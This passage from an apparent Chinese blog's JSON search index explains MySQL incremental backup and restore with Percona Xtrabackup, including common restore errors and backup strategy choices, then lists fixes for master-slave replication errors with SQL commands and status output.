&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x4EC5;&#x80FD;&#x5E94;&#x7528;&#x4E8E;InnoDB&#x6216;XtraDB&#x8868;&#xFF0C;&#x5BF9;&#x4E8E;MyISAM&#x8868;&#x800C;&#x8A00;&#xFF0C;&#x6267;&#x884C;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x65F6;&#x5176;&#x5B9E;&#x8FDB;&#x884C;&#x7684;&#x662F;&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#x3002;# &#x7B2C;&#x4E8C;&#x6B21;&#x589E;&#x91CF;&#x5907;&#x4EFD;innobackupex --defaults-file=/data/mysql/my.cnf --user=root --password=passwd --incremental /data/backup/inc2 --incremental-basedir=/data/backup/inc1/2017-01-20_11-04-31# &#x5982;&#x679C;&#x9700;&#x8981;&#x6062;&#x590D;&#x7684;&#x8BDD;&#x9700;&#x8981;&#x5148;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x64CD;&#x4F5C;innobackupex --apply-log --redo-only /data/backup/full/2017-01-20_10-52-43innobackupex --apply-log --redo-only /data/backup/full/2017-01-20_10-52-43 --incremental-dir=/data/backup/inc1/2017-01-20_11-04-31# &#x5982;&#x679C;&#x5B58;&#x5728;&#x591A;&#x6B21;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7684;&#x8BDD;&#xFF0C;&#x5C31;&#x591A;&#x6B21;&#x6267;&#x884C;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x3002;&#x6B64;&#x5904;&#x6267;&#x884C;&#x9488;&#x5BF9;&#x7684;&#x662F;&#x7B2C;&#x4E8C;&#x6B21;&#x589E;&#x91CF;&#x5907;&#x4EFD;innobackupex --apply-log --redo-only /data/backup/full/2017-01-20_10-52-43 --incremental-dir=/data/backup/inc2/2017-01-20_11-06-41# &#x6062;&#x590D;&#x64CD;&#x4F5C;&#x6F14;&#x7EC3;&#xFF0C;&#x9700;&#x5148;&#x505C;&#x6389;&#x670D;&#x52A1;&#x5668;&#x5E76;&#x8FC1;&#x79FB;&#x5DF2;&#x6709;&#x7684;&#x6570;&#x636E;&#x76EE;&#x5F55;&#xFF0C;&#x8BE6;&#x60C5;&#x89C1;&#x5168;&#x91CF;&#x5907;&#x4EFD;# &#x6267;&#x884C;&#x6062;&#x590D;&#x547D;&#x4EE4;innobackupex --defaults-file=/data/mysql/my.cnf --user=root --password=passwd --copy-back /data/backup/full/2017-01-20_10-52-43 &#x5907;&#x4EFD;&#x6062;&#x590D;&#x5E38;&#x89C1;&#x9519;&#x8BEF;Q&#xFF1A;&#x9488;&#x5BF9;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x4E86;&#x589E;&#x91CF;&#x6062;&#x590D;&#xFF0C;&#x518D;&#x6B21;&#x6267;&#x884C;&#x76F8;&#x5173;&#x6062;&#x590D;&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;1234567xtrabackup: ########################################################xtrabackup: # !!WARNING!! #xtrabackup: # The transaction log file is corrupted. #xtrabackup: # The log was not applied to the intended LSN! #xtrabackup: ########################################################xtrabackup: The intended lsn is 1614986xtrabackup: starting shutdown with innodb_fast_shutdown = 1 A&#xFF1A;&#x6B64;&#x9519;&#x8BEF;&#x662F;&#x63D0;&#x793A;&#x4F60;&#x65E5;&#x5FD7;&#x5DF2;&#x635F;&#x574F;&#xFF0C;&#x5373;&#x4E0A;&#x6B21;&#x7684;&#x6062;&#x590D;&#x547D;&#x4EE4;&#x5DF2;&#x7ECF;&#x5BF9;&#x65E5;&#x5FD7;&#x8FDB;&#x884C;&#x4E86;&#x56DE;&#x6EDA;&#x3002;&#x6240;&#x4EE5;&#x6BCF;&#x6B21;&#x5BF9;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x6267;&#x884C;&#x6062;&#x590D;&#x65F6;&#xFF0C;&#x53EF;&#x4E8B;&#x5148;&#x5907;&#x4EFD;&#x6570;&#x636E;&#xFF0C;&#x4EE5;&#x9632;&#x4E07;&#x4E00;&#x3002; Q&#xFF1A;&#x5BF9;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x6267;&#x884C;&#x6062;&#x590D;&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x62A5;&#x9519;&#x5982;&#x4E0B;&#xFF1A;12innobackupex: Connecting to MySQL server with DSN &apos;dbi:mysql:;mysql_read_default_group=xtrabackup&apos; as &apos;root&apos; (using password: YES).innobackupex: Error: Failed to connect to MySQL server: DBI connect(&apos;;mysql_read_default_group=xtrabackup&apos;,&apos;root&apos;,...) failed: Can&apos;t connect to local MySQL server through socket &apos;/var/lib/mysql/mysql.sock&apos; (2) at /usr/bin/innobackupex line 2995 A&#xFF1A; &#x8BF4;&#x660E;&#x6CA1;&#x6709;&#x8BFB;&#x53D6;&#x5230;my.cnf&#x4E2D;&#x7684;socket&#x8DEF;&#x5F84;&#xFF0C;&#x4E5F;&#x8BF4;&#x660E;&#x5907;&#x4EFD;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x5019;&#x8D70;&#x7684;&#x662F;socket&#x63A5;&#x53E3;&#x5F62;&#x5F0F;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6362;&#x505A;&#x8D70;tcp/ip&#xFF0C;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x4E2D;&#x65B0;&#x589E;&#x53C2;&#x6570;&#x2013;host=127.0.0.1&#x5373;&#x53EF;&#x3002;&#x5982;&#x679C;&#x4ECD;&#x7136;&#x62A5;&#x9519;&#xFF0C;&#x68C0;&#x67E5;&#x76F8;&#x5173;&#x547D;&#x4EE4;&#x662F;&#x5426;&#x6709;&#x62FC;&#x9519;&#x7684;&#x5355;&#x8BCD;&#xFF0C;&#x68C0;&#x67E5;datadir&#x76EE;&#x5F55;&#x662F;&#x5426;&#x6709;&#x3010;mysql:mysql&#x3011;&#x6743;&#x9650;&#x7B49;&#x3002; Q&#xFF1A;xtrabackup Error: datadir must be specified.A&#xFF1A;&#x2013;defaults-file &#x5BF9;&#x5E94;&#x7684; my.cnf &#x6587;&#x4EF6;&#x6CA1;&#x6709;&#x6307;&#x660E;datadir&#x76EE;&#x5F55;&#x3002;&#x5982;&#x679C;&#x6307;&#x660E;&#x4E86;&#x76EE;&#x5F55;&#xFF0C;&#x6267;&#x884C;&#x76F8;&#x5173;&#x547D;&#x4EE4;&#x4ECD;&#x7136;&#x62A5;&#x9519;&#x3002;&#x628A;&#x547D;&#x4EE4;&#x4E2D;&#x7684; &#x2013;defaults-file &#x987A;&#x5E8F;&#x4ECE; &#x2013;password&#x540E;&#x79FB;&#x81F3;innobackupex&#x540E;&#x8BD5;&#x8BD5;&#x3002;innobackupex&#x67E5;&#x627E;datadir&#x4E0D;&#x591F;&#x667A;&#x80FD;&#x3002; &#x5907;&#x4EFD;&#x65B9;&#x6848;&#x7684;&#x9009;&#x62E9;&#x5E38;&#x89C1;&#x7684;&#x5907;&#x4EFD;&#x6709;&#x5168;&#x91CF;&#x5907;&#x4EFD;&#x3001;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x548C;&#x5DEE;&#x5F02;&#x5907;&#x4EFD;&#x3002; &#x9996;&#x5148;&#x9700;&#x8981;&#x5F04;&#x660E;&#x767D;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x548C;&#x5DEE;&#x5F02;&#x5907;&#x4EFD;&#x7684;&#x533A;&#x522B;:&#x589E;&#x91CF;&#x5907;&#x4EFD;&#xFF1A;&#x81EA;&#x4ECE;&#x4EFB;&#x610F;&#x7C7B;&#x578B;&#x7684;&#x4E0A;&#x6B21;&#x5907;&#x4EFD;&#x540E;&#x6709;&#x6240;&#x4FEE;&#x6539;&#x505A;&#x7684;&#x5907;&#x4EFD;&#x3002;&#x5DEE;&#x5F02;&#x5907;&#x4EFD;&#xFF1A;&#x81EA;&#x4E0A;&#x6B21;&#x5168;&#x5907;&#x4EFD;&#x540E;&#x6709;&#x6240;&#x6539;&#x53D8;&#x7684;&#x90E8;&#x5206;&#x800C;&#x505A;&#x7684;&#x5907;&#x4EFD;&#x3002; &#x5168;&#x91CF;&#x5907;&#x4EFD;&#x4E0E;&#x5DEE;&#x5F02;&#x5907;&#x4EFD;&#x7ED3;&#x5408;&#x4EE5;&#x6BCF;&#x5468;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x8BA1;&#x5212;&#x4E3A;&#x4F8B;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x5468;&#x4E00;&#x8FDB;&#x884C;&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#xFF0C;&#x5728;&#x5468;&#x4E8C;&#x81F3;&#x5468;&#x65E5;&#x8FDB;&#x884C;&#x5DEE;&#x5F02;&#x5907;&#x4EFD;&#x3002;&#x5982;&#x679C;&#x5728;&#x5468;&#x65E5;&#x6570;&#x636E;&#x88AB;&#x7834;&#x574F;&#x4E86;&#xFF0C;&#x5219;&#x4F60;&#x53EA;&#x9700;&#x8981;&#x8FD8;&#x539F;&#x5468;&#x4E00;&#x7684;&#x5168;&#x91CF;&#x5907;&#x4EFD;&#x548C;&#x5468;&#x516D;&#x7684;&#x5DEE;&#x5F02;&#x5907;&#x4EFD;&#x3002;&#x8FD9;&#x79CD;&#x7B56;&#x7565;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x9700;&#x8981;&#x65F6;&#x95F4;&#x8F83;&#x591A;&#xFF0C;&#x4F46;&#x8FD8;&#x539F;&#x6570;&#x636E;&#x4F7F;&#x7528;&#x65F6;&#x95F4;&#x8F83;&#x5C11;&#x3002; &#x5168;&#x91CF;&#x5907;&#x4EFD;&#x4E0E;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x7ED3;&#x5408;&#x4EE5;&#x6BCF;&#x5468;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x8BA1;&#x5212;&#x4E3A;&#x4F8B;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x5468;&#x4E00;&#x8FDB;&#x884C;&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#xFF0C;&#x5728;&#x5468;&#x4E8C;&#x81F3;&#x5468;&#x65E5;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x3002;&#x5982;&#x679C;&#x5728;&#x5468;&#x65E5;&#x6570;&#x636E;&#x88AB;&#x7834;&#x574F;&#x4E86;&#xFF0C;&#x5219;&#x4F60;&#x9700;&#x8981;&#x8FD8;&#x539F;&#x5468;&#x4E00;&#x7684;&#x5168;&#x91CF;&#x5907;&#x4EFD;&#x548C;&#x4ECE;&#x5468;&#x4E8C;&#x81F3;&#x5468;&#x516D;&#x7684;&#x6240;&#x6709;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x3002;&#x8FD9;&#x79CD;&#x7B56;&#x7565;&#x5907;&#x4EFD;&#x6570;&#x636E;&#x9700;&#x8981;&#x65F6;&#x95F4;&#x8F83;&#x5C11;&#xFF0C;&#x4F46;&#x8FD8;&#x539F;&#x6570;&#x636E;&#x4F7F;&#x7528;&#x65F6;&#x95F4;&#x8F83;&#x591A;&#x3002;&#x4E14;&#x5468;&#x4E8C;&#x81F3;&#x5468;&#x516D;&#x4EFB;&#x4F55;&#x4E00;&#x4E2A;&#x589E;&#x91CF;&#x6570;&#x636E;&#x635F;&#x574F;&#xFF0C;&#x6240;&#x6709;&#x5907;&#x4EFD;&#x4E0D;&#x53EF;&#x7528;&#x3002; &#x5168;&#x91CF;&#x5907;&#x4EFD;&#x3001;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x548C;&#x5DEE;&#x5F02;&#x5907;&#x4EFD;&#x7ED3;&#x5408;&#x4EE5;&#x6BCF;&#x5468;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x8BA1;&#x5212;&#x4E3A;&#x4F8B;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x5468;&#x4E00;&#x8FDB;&#x884C;&#x5B8C;&#x5168;&#x5907;&#x4EFD;&#xFF0C;&#x5728;&#x5468;&#x4E8C;&#x81F3;&#x5468;&#x65E5;&#x8FDB;&#x884C;&#x5DEE;&#x5F02;&#x5907;&#x4EFD;&#xFF0C;&#x5E76;&#x4E14;&#x6BCF;&#x5929;&#x9488;&#x5BF9;&#x5F53;&#x5929;&#x7684;&#x5DEE;&#x5F02;&#x5907;&#x4EFD;&#x6BCF;&#x9694;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#xFF08;&#x6BD4;&#x5982;&#x534A;&#x5C0F;&#x65F6;&#xFF09;&#x8FDB;&#x884C;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x3002;&#x5982;&#x679C;&#x5728;&#x5468;&#x65E5;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#x70B9;&#x6570;&#x636E;&#x88AB;&#x7834;&#x574F;&#x4E86;&#xFF0C;&#x5219;&#x4F60;&#x9700;&#x8981;&#x8FD8;&#x539F;&#x5468;&#x4E00;&#x7684;&#x5168;&#x91CF;&#x5907;&#x4EFD;&#x548C;&#x5468;&#x516D;&#x7684;&#x5DEE;&#x5F02;&#x5907;&#x4EFD;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8FD8;&#x539F;&#x5468;&#x65E5;&#x6240;&#x505A;&#x7684;&#x6240;&#x6709;&#x589E;&#x91CF;&#x5907;&#x4EFD;&#x3002;&#x8FD9;&#x79CD;&#x7B56;&#x7565;&#x64CD;&#x4F5C;&#x6700;&#x590D;&#x6742;&#xFF0C;&#x4F46;&#x662F;&#x6570;&#x636E;&#x5E93;&#x6700;&#x591A;&#x635F;&#x5931;&#x534A;&#x4E2A;&#x5C0F;&#x65F6;&#x7684;&#x6570;&#x636E;&#x3002; PS&#xFF1A; &#x53EA;&#x505A;&#x5907;&#x4EFD;&#xFF0C;&#x4E0D;&#x505A;&#x6062;&#x590D;&#x6F14;&#x7EC3;&#xFF0C;&#x53EF;&#x80FD;&#x6700;&#x540E;&#x4E00;&#x573A;&#x7A7A;&#x3002;","raw":null,"content":null,"categories":[{"name":"数据库","slug":"数据库","permalink":"http://www.wangxin123.com/categories/数据库/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"},{"name":"完全备份","slug":"完全备份","permalink":"http://www.wangxin123.com/tags/完全备份/"},{"name":"增量备份","slug":"增量备份","permalink":"http://www.wangxin123.com/tags/增量备份/"},{"name":"Percona Xtrabackup","slug":"Percona-Xtrabackup","permalink":"http://www.wangxin123.com/tags/Percona-Xtrabackup/"}]},{"title":"MySQL备份与恢复","slug":"MySQL备份与恢复","date":"2017-01-17T13:18:00.000Z","updated":"2017-02-26T07:37:23.722Z","comments":true,"path":"2017/01/17/MySQL备份与恢复/","link":"","permalink":"http://www.wangxin123.com/2017/01/17/MySQL备份与恢复/","excerpt":"","keywords":null,"text":"&#x6700;&#x8FD1;&#x6574;&#x7406;&#x4E86;&#x4E0B;MySQL&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;&#x7684;&#x77E5;&#x8BC6;&#x70B9;&#xFF0C;&#x90E8;&#x5206;&#x77E5;&#x8BC6;&#x70B9;&#x8FD8;&#x9644;&#x6709;&#x94FE;&#x63A5;&#x3002; &#x5185;&#x5BB9;&#x6301;&#x7EED;&#x66F4;&#x65B0;&#x4E2D;&#xFF0C;&#x8BBF;&#x95EE;&#x5730;&#x5740;&#xFF1A;https://www.processon.com/view/link/58805970e4b098bf4cddc5cd","raw":null,"content":null,"categories":[{"name":"思维导图","slug":"思维导图","permalink":"http://www.wangxin123.com/categories/思维导图/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.wangxin123.com/tags/mysql/"},{"name":"备份","slug":"备份","permalink":"http://www.wangxin123.com/tags/备份/"},{"name":"恢复","slug":"恢复","permalink":"http://www.wangxin123.com/tags/恢复/"}]},{"title":"MySQL主从同步报错故障处理集锦","slug":"MySQL主从同步报错故障处理集锦","date":"2017-01-15T13:18:00.000Z","updated":"2017-01-18T11:32:33.038Z","comments":true,"path":"2017/01/15/MySQL主从同步报错故障处理集锦/","link":"","permalink":"http://www.wangxin123.com/2017/01/15/MySQL主从同步报错故障处理集锦/","excerpt":"&#x524D;&#x8A00;&#x5728;&#x53D1;&#x751F;&#x6545;&#x969C;&#x5207;&#x6362;&#x540E;&#xFF0C;&#x7ECF;&#x5E38;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x540C;&#x6B65;&#x62A5;&#x9519;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x6700;&#x8FD1;&#x6536;&#x96C6;&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x3002; &#x8BB0;&#x5F55;&#x5220;&#x9664;&#x5931;&#x8D25;&#x5728;master&#x4E0A;&#x5220;&#x9664;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x800C;slave&#x4E0A;&#x627E;&#x4E0D;&#x5230;1234Last_SQL_Error: Could not execute Delete_rows event on table hcy.t1; Can&apos;t find record in &apos;t1&apos;, Error_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; the event&apos;s master log mysql-bin.000006, end_log_pos 254 &#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;master&#x8981;&#x5220;&#x9664;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x800C;slave&#x4E0A;&#x627E;&#x4E0D;&#x5230;&#x62A5;&#x9519;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E3B;&#x90FD;&#x5DF2;&#x7ECF;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;&#x4ECE;&#x673A;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x3002;123stop slave;set global sql_slave_skip_counter=1;start slave; &#x5982;&#x679C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x5F88;&#x591A;&#xFF0C;&#x9700;&#x8981;&#x9488;&#x5BF9;&#x8FD9;&#x79CD;&#x9519;&#x8BEF;&#x4E13;&#x95E8;&#x5199;&#x76F8;&#x5173;&#x811A;&#x672C;&#x3002;","keywords":null,"text":"&#x524D;&#x8A00;&#x5728;&#x53D1;&#x751F;&#x6545;&#x969C;&#x5207;&#x6362;&#x540E;&#xFF0C;&#x7ECF;&#x5E38;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;&#x5C31;&#x662F;&#x540C;&#x6B65;&#x62A5;&#x9519;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x6700;&#x8FD1;&#x6536;&#x96C6;&#x7684;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x3002; &#x8BB0;&#x5F55;&#x5220;&#x9664;&#x5931;&#x8D25;&#x5728;master&#x4E0A;&#x5220;&#x9664;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x800C;slave&#x4E0A;&#x627E;&#x4E0D;&#x5230;1234Last_SQL_Error: Could not execute Delete_rows event on table hcy.t1; Can&apos;t find record in &apos;t1&apos;, Error_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; the event&apos;s master log mysql-bin.000006, end_log_pos 254 &#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;master&#x8981;&#x5220;&#x9664;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x800C;slave&#x4E0A;&#x627E;&#x4E0D;&#x5230;&#x62A5;&#x9519;&#xFF0C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E3B;&#x90FD;&#x5DF2;&#x7ECF;&#x5220;&#x9664;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;&#x4ECE;&#x673A;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8DF3;&#x8FC7;&#x3002;123stop slave;set global sql_slave_skip_counter=1;start slave; &#x5982;&#x679C;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x5F88;&#x591A;&#xFF0C;&#x9700;&#x8981;&#x9488;&#x5BF9;&#x8FD9;&#x79CD;&#x9519;&#x8BEF;&#x4E13;&#x95E8;&#x5199;&#x76F8;&#x5173;&#x811A;&#x672C;&#x3002; &#x4E3B;&#x952E;&#x91CD;&#x590D;&#x5728;slave&#x5DF2;&#x7ECF;&#x6709;&#x8BE5;&#x8BB0;&#x5F55;&#xFF0C;&#x53C8;&#x5728;master&#x4E0A;&#x63D2;&#x5165;&#x4E86;&#x540C;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#x3002;1234Last_SQL_Error: Could not execute Write_rows event on table hcy.t1; Duplicate entry &apos;2&apos; for key &apos;PRIMARY&apos;, Error_code: 1062; handler error HA_ERR_FOUND_DUPP_KEY; the event&apos;s master log mysql-bin.000006, end_log_pos 924 &#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A; &#x5728;slave&#x4E0A;&#x7528;desc hcy.t1; &#x5148;&#x770B;&#x4E0B;&#x8868;&#x7ED3;&#x6784;&#xFF1A;1234567mysql&gt; desc hcy.t1;+-------+---------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+---------+------+-----+---------+-------+| id | int(11) | NO | PRI | 0 | | | name | char(4) | YES | | NULL | | +-------+---------+------+-----+---------+-------+ &#x5220;&#x9664;&#x91CD;&#x590D;&#x7684;&#x4E3B;&#x952E;123456789101112mysql&gt; delete from t1 where id=2;Query OK, 1 row affected (0.00 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\\G;&#x2026;&#x2026;Slave_IO_Running: YesSlave_SQL_Running: Yes&#x2026;&#x2026;mysql&gt; select * from t1 where id=2; &#x5728;master&#x4E0A;&#x548C;slave&#x4E0A;&#x518D;&#x5206;&#x522B;&#x786E;&#x8BA4;&#x4E00;&#x4E0B;&#x3002; &#x66F4;&#x65B0;&#x4E22;&#x5931;&#x5728;master&#x4E0A;&#x66F4;&#x65B0;&#x4E00;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x800C;slave&#x4E0A;&#x627E;&#x4E0D;&#x5230;&#xFF0C;&#x4E22;&#x5931;&#x4E86;&#x6570;&#x636E;&#x3002;12345Last_SQL_Error: Could not execute Update_rows event on table hcy.t1; Can&apos;t find record in &apos;t1&apos;, Error_code: 1032; handler error HA_ERR_KEY_NOT_FOUND; the event&apos;s master log mysql-bin.000010, end_log_pos 794 &#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A; &#x5728;master&#x4E0A;&#xFF0C;&#x7528;mysqlbinlog &#x5206;&#x6790;&#x4E0B;&#x51FA;&#x9519;&#x7684;binlog&#x65E5;&#x5FD7;&#x5728;&#x5E72;&#x4EC0;&#x4E48;&#x3002;1234567891011121314151617/usr/local/mysql/bin/mysqlbinlog --no-defaults -v -v --base64-output=DECODE-ROWS mysql-bin.000010 | grep -A &apos;10&apos; 794#120302 12:08:36 server id 22 end_log_pos 794 Update_rows: table id 33 flags: STMT_END_F### UPDATE hcy.t1### WHERE### @1=2 /* INT meta=0 nullable=0 is_null=0 */### @2=&apos;bbc&apos; /* STRING(4) meta=65028 nullable=1 is_null=0 */### SET### @1=2 /* INT meta=0 nullable=0 is_null=0 */### @2=&apos;BTV&apos; /* STRING(4) meta=65028 nullable=1 is_null=0 */# at 794#120302 12:08:36 server id 22 end_log_pos 821 Xid = 60COMMIT/*!*/;DELIMITER ;# End of log fileROLLBACK /* added by mysqlbinlog */;/*!50003 SET COMPLETION_TYPE=@OLD_COMPLETION_TYPE*/; &#x5728;slave&#x4E0A;&#xFF0C;&#x67E5;&#x627E;&#x4E0B;&#x66F4;&#x65B0;&#x540E;&#x7684;&#x90A3;&#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x5E94;&#x8BE5;&#x662F;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x3002;12mysql&gt; select * from t1 where id=2;Empty set (0.00 sec) &#x7136;&#x540E;&#x518D;&#x5230;master&#x67E5;&#x770B;1234567mysql&gt; select * from t1 where id=2;+----+------+| id | name |+----+------+| 2 | BTV | +----+------+1 row in set (0.00 sec) &#x628A;&#x4E22;&#x5931;&#x7684;&#x6570;&#x636E;&#x5728;slave&#x4E0A;&#x586B;&#x8865;&#xFF0C;&#x7136;&#x540E;&#x8DF3;&#x8FC7;&#x62A5;&#x9519;&#x5373;&#x53EF;&#x3002;123456789101112131415161718192021mysql&gt; insert into t1 values (2,&apos;BTV&apos;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from t1 where id=2; +----+------+| id | name |+----+------+| 2 | BTV | +----+------+1 row in set (0.00 sec)mysql&gt; stop slave ;set global sql_slave_skip_counter=1;start slave;Query OK, 0 rows affected (0.01 sec)Query OK, 0 rows affected (0.00 sec)Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\\G;&#x2026;&#x2026; Slave_IO_Running: Yes Slave_SQL_Running: Yes&#x2026;&#x2026; 1236&#x9519;&#x8BEF;, &#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x7F3A;&#x5931;&#x8BEF;&#x5220;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x7B49;&#x5404;&#x79CD;&#x539F;&#x56E0;&#xFF0C;&#x5BFC;&#x81F4;&#x4E3B;&#x5E93;mysql-bin.000012&#x6587;&#x4EF6;&#x4E22;&#x5931;&#xFF0C;&#x4ECE;&#x5E93;&#x540C;&#x6B65;&#x5931;&#x8D25;&#x3002;1234Master_Log_File: mysql-bin.000012Slave_IO_Running: NoSlave_SQL_Running: YesLast_IO_Error: Got fatal error 1236 from master when reading data from binary log: &apos;Could not find first log file name in binary log index file&apos; &#x9996;&#x5148;&#x505C;&#x6B62;&#x4ECE;&#x5E93;&#x540C;&#x6B65; 1slave stop; &#x67E5;&#x770B;&#x4E3B;&#x5E93;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x548C;&#x4F4D;&#x7F6E; 123456mysql&gt; show master logs;+------------------+-----------+| Log_name | File_size |+------------------+-----------+| mysql-bin.000013 | 154 |+------------------+-----------+ &#x56DE;&#x4ECE;&#x5E93;&#xFF0C;&#x4F7F;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x548C;&#x4F4D;&#x7F6E;&#x5BF9;&#x5E94;&#x4E3B;&#x5E93; 1CHANGE MASTER TO MASTER_LOG_FILE=&apos;log-bin.000013&apos;,MASTER_LOG_POS=154; &#x6700;&#x540E;&#xFF0C;&#x542F;&#x52A8;&#x4ECE;&#x5E93;&#xFF1A; 12345678slave start;show slave status\\G;Master_Log_File: mysql-bin.000013Slave_IO_Running: YesSlave_SQL_Running: YesLast_IO_Error: &#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x635F;&#x574F;slave&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;relay-bin&#x635F;&#x574F;&#x3002;123Last_SQL_Error: Error initializing relay log position: I/O error reading the header from the binary logLast_SQL_Error: Error initializing relay log position: Binlog has bad magic number; It&apos;s not a binary log file that can be used by this version of MySQL 1&#x3001;&#x624B;&#x5DE5;&#x4FEE;&#x590D;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#xFF1A;&#x627E;&#x5230;&#x540C;&#x6B65;&#x7684;binlog&#x548C;POS&#x70B9;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x65B0;&#x505A;&#x540C;&#x6B65;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x6709;&#x65B0;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x503C;&#x4E86;&#x3002; &#x4F8B;&#x5B50;&#xFF1A;123456789101112131415161718192021222324252627mysql&gt; show slave status\\G;*************************** 1. row *************************** Master_Log_File: mysql-bin.000010 Read_Master_Log_Pos: 1191 Relay_Log_File: vm02-relay-bin.000005 Relay_Log_Pos: 253 Relay_Master_Log_File: mysql-bin.000010 Slave_IO_Running: Yes Slave_SQL_Running: No Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 1593 Last_Error: Error initializing relay log position: I/O error reading the header from the binary log Skip_Counter: 1 Exec_Master_Log_Pos: 821Slave_IO_Running &#xFF1A;&#x63A5;&#x6536;master&#x7684;binlog&#x4FE1;&#x606F; Master_Log_File Read_Master_Log_PosSlave_SQL_Running&#xFF1A;&#x6267;&#x884C;&#x5199;&#x64CD;&#x4F5C; Relay_Master_Log_File Exec_Master_Log_Pos &#x4EE5;&#x6267;&#x884C;&#x5199;&#x7684;binlog&#x548C;POS&#x70B9;&#x4E3A;&#x51C6;&#x3002;12Relay_Master_Log_File: mysql-bin.000010Exec_Master_Log_Pos: 821 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950mysql&gt; stop slave;Query OK, 0 rows affected (0.01 sec)mysql&gt; CHANGE MASTER TO MASTER_LOG_FILE=&apos;mysql-bin.000010&apos;,MASTER_LOG_POS=821;Query OK, 0 rows affected (0.01 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\\G;*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.8.22 Master_User: repl Master_Port: 3306 Connect_Retry: 10 Master_Log_File: mysql-bin.000010 Read_Master_Log_Pos: 